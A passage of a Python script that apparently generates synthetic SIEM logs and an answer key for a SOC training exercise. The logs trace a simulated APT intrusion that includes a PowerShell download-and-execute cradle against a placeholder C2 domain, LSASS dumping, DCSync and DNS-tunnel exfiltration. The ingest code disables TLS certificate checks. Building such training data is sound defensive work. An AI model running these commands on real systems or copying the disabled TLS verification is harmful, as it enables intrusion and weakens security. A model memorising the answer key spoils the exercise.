    sec(t_dec2 + dt.timedelta(minutes=1), "DC-01", 4728, "A member was added to a security-enabled global group.",
        Group_Name="Report Viewers", Member_Account_Name=LEGIT_CONTRACTOR_ACCOUNT, Subject_Account_Name=LEGIT_CONTRACTOR_CREATOR)
    ticket(day(3, 13, 30, 0), "TCK-1006", "Provision reporting service account for Finance BI contractor", "Access Request",
           "closed", "a.mercer", approver="t.deveraux", notes="svc_reporting created for read-only Finance reporting integration, scoped to Report Viewers group only.")

    # ---- Day 4 (06-26): RDP brute force -- RA STAGE 4 hides here, legit helpdesk tool use decoy
    rdp_fail_n = random.randint(1400, 2200)
    for _ in range(rdp_fail_n):
        t = day(4, random.randint(0, 23), random.randint(0, 59), random.randint(0, 59))
        ip = random.choice(GA_RDP_IPS)
        h = "JUMP-01"
        sec(t, h, 4625, "An account failed to log on.", Logon_Type=10,
            Account_Name=random.choice(["administrator", "admin", "jump", "svc_backup"]), Account_Domain=NB,
            Source_Network_Address=ip, Sub_Status="0xC000006A")
    for ip in GA_RDP_IPS:
        ids(day(4, 12, 0, 0), ip, HOSTS["JUMP-01"], 3389, "ET SCAN RDP Brute Force Attempt", "high", "blocked")
        fw(day(4, 12, 5, 0), ip, HOSTS["JUMP-01"], 3389, "deny")
    soc_case(day(4, 6, 0, 0), "GA-CASE-0005", "RDP Brute Force Attempt Against JUMP-01",
              "Credential Access", "Medium", "opened", "l.chen", affected_hosts="JUMP-01")
    soc_case(day(4, 9, 0, 0), "GA-CASE-0005", "RDP Brute Force Attempt Against JUMP-01",
              "Credential Access", "Medium", "investigating", "l.chen", note="No successful authentication from any source IP in this campaign.")
    soc_case(day(4, 13, 0, 0), "GA-CASE-0005", "RDP Brute Force Attempt Against JUMP-01",
              "Credential Access", "Medium", "contained", "l.chen", note="Source IPs blocked at perimeter firewall.")
    soc_case(day(4, 16, 0, 0), "GA-CASE-0005", "RDP Brute Force Attempt Against JUMP-01",
              "Credential Access", "Medium", "closed", "l.chen", note="Network Level Authentication enforced on JUMP-01 as hardening measure.")
    ticket(day(4, 16, 5, 0), "TCK-1007", "Harden JUMP-01 RDP (enforce NLA)", "Change Request",
           "closed", "l.chen", approver="a.mercer", related_case="GA-CASE-0005", notes="NLA enforced via GPO Templar-WSUS-Patch-Policy.")
    t_hd = day(4, 10, 15, 0)
    sysmon(t_hd, "WKS-107", 10, SourceImage=LEGIT_HELPDESK_TOOL, TargetImage=r"C:\Windows\System32\lsass.exe",
           GrantedAccess="0x1400", CallTrace="dbghelp.dll+MiniDumpWriteDump", User=f"{NB}\\a.mercer")
    sec(t_hd, "WKS-107", 4648, "A logon was attempted using explicit credentials.",
        Subject_Account_Name="a.mercer", Target_Account_Name="r.okoye", Target_Server="WKS-107")
    ticket(day(4, 10, 0, 0), "TCK-1008", "WKS-107 unresponsive application troubleshooting (r.okoye)", "Helpdesk",
           "closed", "r.okoye", approver="a.mercer", notes="Memory diagnostic performed with MemCapture per standard helpdesk runbook. Application restarted, resolved.")

    # ---- Day 5 (06-27, Saturday): Exploit attempt vs VPN appliance -- RA STAGE 5 hides here, legit GPO change decoy
    for i in range(random.randint(35, 70)):
        t = day(5, random.randint(1, 6), (i * 11) % 60, (i * 3) % 60)
        ip = random.choice(GA_IPS)
        ids(t, ip, HOSTS["VPN-GW"], 443, "ET EXPLOIT VPN Appliance Auth-Bypass Attempt (CVE-2024-11XXX)", "critical", "blocked")
    fw(day(5, 6, 30, 0), GA_IPS[3], HOSTS["VPN-GW"], 443, "deny")
    system(day(5, 8, 0, 0), "VPN-GW", 19, "Installation Successful: VPN appliance firmware patched to 9.1.4 (CVE-2024-11XXX).", update="FW-9.1.4")
    soc_case(day(5, 3, 0, 0), "GA-CASE-0006", "Exploit Attempt Against VPN Appliance (CVE-2024-11XXX)",
              "Initial Access", "Critical", "opened", "l.chen", affected_hosts="VPN-GW")
    soc_case(day(5, 5, 0, 0), "GA-CASE-0006", "Exploit Attempt Against VPN Appliance (CVE-2024-11XXX)",
              "Initial Access", "Critical", "investigating", "l.chen", note="IPS blocked all exploitation attempts. Appliance not vulnerable to observed variant.")
    soc_case(day(5, 8, 30, 0), "GA-CASE-0006", "Exploit Attempt Against VPN Appliance (CVE-2024-11XXX)",
              "Initial Access", "Critical", "contained", "l.chen")
    soc_case(day(5, 9, 0, 0), "GA-CASE-0006", "Exploit Attempt Against VPN Appliance (CVE-2024-11XXX)",
              "Initial Access", "Critical", "closed", "l.chen", note="Firmware patched proactively. No breach.")
    ticket(day(5, 9, 5, 0), "TCK-1009", "Emergency firmware patch for VPN-GW (CVE-2024-11XXX)", "Change Request",
           "closed", "l.chen", approver="a.mercer", related_case="GA-CASE-0006", notes="Weekend emergency change, firmware 9.1.4 applied.")
    sec(day(5, 10, 0, 0), "DC-01", 5136, "A directory service object was modified.",
        Object_DN="CN={A1B2C3D4-1111-2222-3333-444455556666},CN=Policies,CN=System,DC=templarhq,DC=local",
        GPO_Name="Templar-WSUS-Patch-Policy", Attribute="gPCMachineExtensionNames", Account_Name=LEGIT_GPO_ADMIN)
    ticket(day(5, 9, 50, 0), "TCK-1010", "Update WSUS patch policy GPO to include NLA hardening (TCK-1007)", "Change Request",
           "closed", "a.mercer", approver="t.deveraux", notes="Scheduled weekend maintenance window per TCK-1007.")

    # ---- Day 6 (06-28, Sunday): Phishing round 2 (minor) -- RA STAGE 6 + fragment plant hides here
    for _ in range(random.randint(140, 220)):
        t = day(6, random.randint(6, 20), random.randint(0, 59), 0)
        mail(t, f"billing@{GA_PHISH_DOMAINS[2]}", f"{random.choice(USERS)}@templarhq.local",
             "Please Review the Attached Contract", "blocked", attachment="contract_review.pdf.html", verdict="phishing")
    soc_case(day(6, 9, 0, 0), "GA-CASE-0007", "Phishing Campaign Round 2 (Low Yield)",
              "Reconnaissance", "Low", "opened", "r.okoye")
    soc_case(day(6, 10, 0, 0), "GA-CASE-0007", "Phishing Campaign Round 2 (Low Yield)",
              "Reconnaissance", "Low", "closed", "r.okoye", note="All messages blocked at gateway. No user interaction.")

    # ---- Day 7 (06-29): quiet day, SOC monitoring only
    for _ in range(random.randint(15, 30)):
        t = day(7, random.randint(8, 18), random.randint(0, 59), 0)
        ip = random.choice(GA_IPS)
        ids(t, ip, HOSTS["WEBPUB-01"], 443, "ET SCAN Suspicious User-Agent Header", "low", "alert")
    soc_case(day(7, 9, 0, 0), "SOC-DAILY-0629", "Daily Monitoring Summary",
              "Monitoring", "Info", "closed", "l.chen", note="Low background scanning from known watchlist IPs. No active incidents.")


# ================================================================ ROGUE ASSASSIN APT (7 hidden stages)
def gen_rogue_assassin():
    # ---- STAGE 1 (Day1 / 06-23, INV-1): Initial Access hidden inside GA brute-force noise
    t1 = day(1, 3, 17, 42)
    vpn(t1, RA["foothold_account"], RA["foothold_vpn_ip"], "success")
    fw(day(1, 3, 17, 40), RA["foothold_vpn_ip"], HOSTS["VPN-GW"], 443, "allow")
    sec(t1, RA["foothold_host"], 4624, "An account was successfully logged on.", Logon_Type=10,
        Account_Name=RA["foothold_account"], Account_Domain=NB, Source_Network_Address=RA["foothold_vpn_ip"],
        Logon_Process="User32", Authentication_Package="Negotiate")

    # ---- STAGE 2 (Day2 / 06-24, INV-2): Execution & Evasion, hidden inside phishing-response noise
    t2 = day(2, 2, 50, 0)
    enc = "cG93ZXJzaGVsbCAtbm9wIC1lbmM9REVDT0RFRF9CRUFDT04="
    posh(t2, RA["foothold_host"], f"IEX (New-Object Net.WebClient).DownloadString('https://{RA['c2_domain']}/a/sync.ps1')", RA["foothold_account"])
    sysmon(t2, RA["foothold_host"], 1, Image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
           User=f"{NB}\\{RA['foothold_account']}", ParentImage=r"C:\Windows\System32\cmd.exe",
           CommandLine=f"powershell.exe -nop -w hidden -enc {enc}")
    browser(t2, RA["foothold_host"], RA["foothold_account"], f"https://{RA['c2_domain']}/a/sync.ps1", "download", filename="sync.ps1")
    defender(day(2, 2, 53, 0), RA["foothold_host"], 5007, "N/A", "ExclusionAdded",
             Path=RA["defender_exclusion"], Note="Real-time protection exclusion added")
    sysmon(day(2, 2, 56, 0), RA["foothold_host"], 11, Image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
           TargetFilename=RA["payload_path"], Hashes=f"SHA256={RA['payload_sha256']}")
    sec(day(2, 3, 1, 0), RA["foothold_host"], 1102, "The audit log was cleared.",
        SubjectUserName=RA["foothold_account"], SubjectDomainName=NB)

    # ---- STAGE 3 (Day3 / 06-25, INV-3): Persistence, blended with legit onboarding + legit contractor account
    t3 = day(3, 1, 40, 0)
    sec(t3, "DC-01", 4720, "A user account was created.",
        Target_Account_Name=RA["backdoor_account"], Subject_Account_Name=RA["foothold_account"])
    sec(day(3, 1, 42, 0), "DC-01", 4728, "A member was added to a security-enabled global group.",
        Group_Name="Backup Operators", Member_Account_Name=RA["backdoor_account"], Subject_Account_Name=RA["foothold_account"])
    sec(day(3, 2, 5, 0), RA["foothold_host"], 4698, "A scheduled task was created.",
        Task_Name=RA["sched_task"], Account_Name=RA["foothold_account"], Command=RA["payload_path"])
    system(day(3, 2, 6, 0), RA["foothold_host"], 7045, "A service was installed in the system.",
           Service_Name=RA["service_name"], Image_Path=RA["payload_path"], Service_Type="user mode service")
    sysmon(day(3, 2, 7, 0), RA["foothold_host"], 13, EventType="SetValue",
           TargetObject=rf"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\{RA['run_key_value']}",
           Details=RA["payload_path"], Image=RA["payload_path"])

    # ---- STAGE 4 (Day4 / 06-26, INV-4): Credential Access, blended with legit helpdesk tool use
    for i in range(6):
        sec(day(4, 2, 10, i * 4), "DC-01", 4769, "A Kerberos service ticket was requested.",
            Service_Name=RA["kerberoast_target"], Account_Name=RA["foothold_account"],
            Ticket_Encryption_Type="0x17", Client_Address=HOSTS[RA["foothold_host"]])
    sysmon(day(4, 2, 30, 0), "ADMIN-WS", 10, SourceImage=RA["procdump_path"],
           TargetImage=r"C:\Windows\System32\lsass.exe", GrantedAccess="0x1410",
           CallTrace="dbghelp.dll+MiniDumpWriteDump", User=f"{NB}\\{RA['foothold_account']}")
    sec(day(4, 2, 33, 0), "ADMIN-WS", 4648, "A logon was attempted using explicit credentials.",
        Subject_Account_Name=RA["foothold_account"], Target_Account_Name="t.deveraux", Target_Server="ADMIN-WS")

    # ---- STAGE 5 (Day5 / 06-27 weekend, INV-5): Privilege Escalation & Domain Dominance
    t5 = day(5, 1, 12, 0)
    sec(t5, "DC-01", 4662, "An operation was performed on an Active Directory object.",
        Account_Name=RA["backdoor_account"], Object_Type="domainDNS",
        Properties="Replicating Directory Changes All", Access="Control Access", Client_Address=HOSTS[RA["foothold_host"]])
    sec(day(5, 1, 14, 0), "DC-01", 4728, "A member was added to a security-enabled global group.",
        Group_Name=RA["sensitive_group"], Member_Account_Name=RA["backdoor_account"], Subject_Account_Name=RA["backdoor_account"])
    sec(day(5, 1, 15, 0), "DC-01", 4672, "Special privileges assigned to new logon.",
        Account_Name=RA["backdoor_account"], Privileges="SeDebugPrivilege,SeTcbPrivilege")
    sec(day(5, 1, 20, 0), "DC-01", 5136, "A directory service object was modified.",
        Object_DN=f"CN={{{RA['gpo_guid']}}},CN=Policies,CN=System,DC=templarhq,DC=local",
        GPO_Name=RA["gpo_name"], Attribute="gPCMachineExtensionNames", Account_Name=RA["backdoor_account"])

    # ---- STAGE 6 (Day6 / 06-28, INV-6): Lateral Movement toward the Vault + physical badge anomaly
    for h in ["FS-02", "SQL-01", "VAULT-SRV"]:
        sec(day(6, 2, 5, 0), h, 4624, "An account was successfully logged on.", Logon_Type=3,
            Account_Name=RA["backdoor_account"], Account_Domain=NB, Source_Network_Address=HOSTS[RA["foothold_host"]],
            Logon_Process="NtLmSsp", Authentication_Package="NTLM")
    system(day(6, 2, 6, 0), "FS-02", 7045, "A service was installed in the system.",
           Service_Name="PSEXESVC", Image_Path=r"C:\Windows\PSEXESVC.exe", Service_Type="user mode service")
    sec(day(6, 2, 10, 0), "VAULT-SRV", 5140, "A network share object was accessed.",
        Share_Name=RA["vault_share"], Account_Name=RA["backdoor_account"], Source_Address=HOSTS[RA["foothold_host"]])
    sec(day(6, 2, 12, 0), "VAULT-SRV", 5145, "A network share object was checked for access.",
        Share_Name=RA["vault_share"], Relative_Target_Name="AppleOfEden\\project_manifest.docx",
        Account_Name=RA["backdoor_account"])
    sysmon(day(6, 2, 20, 0), "VAULT-SRV", 11, Image=r"C:\ProgramData\Sync\7z.exe",
           TargetFilename=rf"C:\ProgramData\Sync\{RA['exfil_archive']}")
    badge(day(6, 2, 15, 0), RA["badge_id"], RA["badge_employee"], "Server Room / Vault Access", "in", "granted")
    badge(day(6, 2, 45, 0), RA["badge_id"], RA["badge_employee"], "Server Room / Vault Access", "out", "granted")

    # ---- FRAGMENT PLANT (Day6 / 06-28 late, discovered during INV-7)
    sysmon(day(6, 23, 10, 0), RA["fragment_host"], 11, Image=RA["payload_path"], User=f"{NB}\\{RA['backdoor_account']}",
           TargetFilename=RA["fragment_path"],
           Hashes="SHA256=e4d5c6b7a8091827364f5e6d7c8b9a001122334455667788990011223344ab")
    sec(day(6, 23, 12, 0), RA["fragment_host"], 5140, "A network share object was accessed.",
        Share_Name=RA["evidence_share"], Account_Name=RA["backdoor_account"], Source_Address=HOSTS[RA["foothold_host"]])

    # ---- STAGE 7 (Day7 / 06-29, INV-7): Exfiltration, Anti-Forensics & Attribution
    for i in range(40):
        chunk = "".join(random.choice("0123456789abcdef") for _ in range(40))
        dns(day(7, 3, i // 2, (i * 3) % 60), RA["foothold_host"], HOSTS[RA["foothold_host"]],
            f"{chunk}.{RA['dns_tunnel_domain']}", "TXT", "")
    iis(day(7, 3, 40, 0), RA["c2_ip"], "POST", "/a/upload", 200, "SyncClient/1.0", 62481203, host="WEBPUB-01")
    fw(day(7, 3, 40, 5), HOSTS[RA["foothold_host"]], RA["c2_ip"], 443, "allow")
    sysmon(day(7, 3, 50, 0), RA["foothold_host"], 2, Image=RA["payload_path"],
           TargetFilename=RA["payload_path"], Note="File creation time changed (timestomp)")
    sysmon(day(7, 4, 5, 0), RA["foothold_host"], 11, Image=RA["payload_path"],
           TargetFilename=RA["taunt_file"],
           Note=f"The Templars watched the wrong war. -- Rogue Assassins // {RA['operator_handle']}")
    sec(day(7, 4, 20, 0), RA["foothold_host"], 1102, "The audit log was cleared.",
        SubjectUserName=RA["backdoor_account"], SubjectDomainName=NB)


IOC_ENTRIES = []

# ================================================================ HEC ingest
def send():
    ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
    EVENTS.sort(key=lambda e: e[0])
    batch, sent = [], 0
    def flush(b):
        nonlocal sent
        if not b: return
        data = "".join(json.dumps({"time": e[0], "host": e[1], "source": e[3], "sourcetype": e[2],
                                    "index": INDEX, "event": e[4]}) for e in b).encode()
        req = urllib.request.Request(HEC_URL, data=data, headers={"Authorization": f"Splunk {HEC_TOKEN}"})
        with urllib.request.urlopen(req, context=ctx, timeout=60) as r:
            r.read()
        sent += len(b)
    for e in EVENTS:
        batch.append(e)
        if len(batch) >= 500:
            flush(batch); batch = []
            if sent % 5000 == 0: print(f"  sent {sent}...", flush=True)
    flush(batch)
    return sent

def answer_key():
    return {
        "INV-1 The Convergence (Initial Access)": {
            "compromised_account": RA["foothold_account"], "source_ip": RA["foothold_vpn_ip"],
            "first_host": RA["foothold_host"], "timestamp_utc": "2026-06-23T03:17:42Z",
            "elimination_note": f"Near-miss decoy: {LEGIT_EMERGENCY_SVC_ACCOUNT} also logs on Type10 from a foreign IP that day, but TCK-1003 covers it -- svc_backup's logon has no matching ticket."},
        "INV-2 Ghost in the Machine (Execution/Evasion)": {
            "c2_domain": RA["c2_domain"], "defender_exclusion": RA["defender_exclusion"],
            "log_cleared_host": RA["foothold_host"], "payload_sha256": RA["payload_sha256"]},
        "INV-3 Quiet Roots (Persistence)": {
            "scheduled_task": RA["sched_task"], "service": RA["service_name"],
            "run_key": RA["run_key_value"], "backdoor_account": RA["backdoor_account"],
            "elimination_note": f"Near-miss decoy: {LEGIT_CONTRACTOR_ACCOUNT} is also created same day by a.mercer, but TCK-1006 covers it -- svc_health's creation by svc_backup has no matching ticket."},
        "INV-4 Silent Harvest (Credential Access)": {
            "kerberoast_target": RA["kerberoast_target"], "lsass_tool": RA["procdump_path"],
            "lsass_host": "ADMIN-WS"},
        "INV-5 Crown Jewels (Priv Esc/Dominance)": {
            "dcsync_source_host": RA["foothold_host"], "sensitive_group": RA["sensitive_group"],
            "backdoor_account": RA["backdoor_account"], "modified_gpo": RA["gpo_name"], "gpo_guid": RA["gpo_guid"]},
        "INV-6 Shadow Steps (Lateral Movement/Vault)": {
            "target_hosts": "FS-02, SQL-01, VAULT-SRV", "tool": "PsExec (PSEXESVC)",
            "vault_share": RA["vault_share"], "badge_employee": RA["badge_employee"], "badge_id": RA["badge_id"]},
        "INV-7 The Hidden Fragment (Exfil/Anti-Forensics/Attribution)": {
            "dns_exfil_domain": RA["dns_tunnel_domain"], "c2_exfil_domain": RA["c2_domain"],
            "exfil_archive": RA["exfil_archive"], "operator_handle": RA["operator_handle"],
            "attribution": "Rogue Assassins", "taunt_file": RA["taunt_file"],
            "fragment_path": RA["fragment_path"], "fragment_planted_by": RA["backdoor_account"],
            "fragment_case_id": RA["fragment_case_id"]},
    }

if __name__ == "__main__":
    gen_normal(); gen_good_assassin(); gen_rogue_assassin()
    print(f"[gen] built {len(EVENTS)} events across {len(set(e[2] for e in EVENTS))} sourcetypes", flush=True)
    c = Counter(e[2] for e in EVENTS)
    for st, n in c.most_common(): print(f"    {n:6d}  {st}")
    print(f"    IOC lookup entries: {len(IOC_ENTRIES)}")
    if DRYRUN or not HEC_TOKEN:
        print("\n=== ANSWER KEY ===")
        print(json.dumps(answer_key(), indent=2))
        if not HEC_TOKEN and not DRYRUN: print("\n[!] HEC_TOKEN not set -- dry run only.")
    else:
        n = send()
        print(f"[gen] ingested {n} events into index={INDEX}", flush=True)
        with open("/tmp/templar_ioc_kv.csv", "w") as f:
            f.write("ioc_value,ioc_type,note\n")
            for v, t, note in IOC_ENTRIES:
                f.write(f'"{v}","{t}","{note}"\n')
        print(f"[gen] wrote {len(IOC_ENTRIES)} IOC lookup rows to /tmp/templar_ioc_kv.csv", flush=True)
        print("\n=== ANSWER KEY ===")
        print(json.dumps(answer_key(), indent=2))
